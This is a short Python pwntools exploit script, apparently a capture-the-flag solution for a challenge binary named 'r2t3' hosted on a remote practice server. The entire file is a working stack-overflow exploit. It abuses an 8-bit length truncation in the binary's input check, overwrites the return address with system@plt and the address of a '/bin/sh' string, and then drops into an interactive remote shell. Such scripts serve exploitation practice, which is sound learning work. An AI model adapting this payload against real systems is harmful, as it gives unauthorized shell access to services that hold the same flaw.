#!/usr/bin/python3.6
from pwn import *

exec_path = './r2t3'
elf = ELF(exec_path)
# proc = process(exec_path)
proc = remote("node3.buuoj.cn", 28147)

system_plt = elf.sym['system']
main_sym = elf.sym['main']
exit_sym = elf.sym['exit']
# ROPgadget --binary r2t3 --string '/bin/sh'
binsh_addr = 0x08048760
# ROPgadget --binary r2t3 --only 'pop|ret'
pop_ret_addr = 0x080483d5

log.info(f'system@plt={hex(system_plt)}; /bin/sh={hex(binsh_addr)}')
log.info(f'main={hex(main_sym)}; exit={hex(exit_sym)}')

payload = b'i' * (0x11+0x4) + p32(system_plt) + p32(main_sym) + p32(binsh_addr) # + p32(exit_sym) + p32(exit_sym) + p32()
# uint8_t length = (uint8_t) strlen(input);
trailing = b'kayoch1n'
payload += b'i' * (0x105 - len(trailing) - len(payload)) + trailing + b'\x00'
log.info(f'len of payload={hex(len(payload))}')

proc.recvuntil(b'Please input your name:')
proc.sendline(payload)
proc.interactive()
